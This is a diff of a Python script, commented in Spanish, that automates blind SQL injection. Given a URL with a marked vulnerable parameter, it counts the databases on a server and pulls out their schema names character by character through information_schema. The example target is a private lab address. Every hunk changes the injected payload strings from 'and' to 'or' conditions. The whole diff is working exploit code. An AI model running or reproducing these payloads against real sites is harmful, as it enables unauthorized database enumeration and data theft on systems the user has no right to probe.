@@ -5,7 +5,7 @@ import curses
 def sacarNumTablas(url):
     #print("sacar num bases de datos")
     indice = url.find("*")
-    payload = "'+and+(select+count(schema_name)+from+information_schema.schemata)%3d@+--+-+"
+    payload = "'+or+(select+count(schema_name)+from+information_schema.schemata)%3d@+--+-+"
     if indice == -1:
         print("No se encontro el asterisco (*) en la cadena base.")
         return 0
@@ -45,7 +45,7 @@ def sacarNumTablas(url):
 
 def SacarLargoNombre(numBase, url, numeroABuscarLargoNombre):
     #print("sacar nombre")
-    payload = "'+and+(select+length(schema_name)+from+information_schema.schemata+limit+^,1)=@+--+-+"
+    payload = "'+or+(select+length(schema_name)+from+information_schema.schemata+limit+^,1)=@+--+-+"
     payloadPersonalizado = payload.replace("^", str(numBase))
     
     try:
@@ -89,7 +89,7 @@ def sacarNombre(longitudNombreTabla, url, numTabla):
     except requests.exceptions.HTTPError:
         print(f"Error al obtener la pagina web: {url}")
 
-    payload = "'+and+substring((select+schema_name+from+information_schema.schemata+limit+^,1),@,1)='/'+--+-+"
+    payload = "'+or+substring((select+schema_name+from+information_schema.schemata+limit+^,1),@,1)='/'+--+-+"
     payloadPers = payload.replace("^" ,str(numTabla))
     nombreTabla = ""
     for i in range (longitudNombreTabla):
@@ -119,7 +119,7 @@ def sacarNombre(longitudNombreTabla, url, numTabla):
 #####################################################################################################
 #print("Hola mundo")
 url=(input("Introduzca la URL, con un asterisco en el parametro vulnerable: "))
-#"http://10.0.2.21/sqli/example1.php?name=root*HTTP/1.1"
+#"http://10.0.2.21/sqli/example1.php?name=*HTTP/1.1"
 numeroBaseDeDatos=sacarNumTablas(url)
 if(numeroBaseDeDatos !=0):
     for i in range(numeroBaseDeDatos):
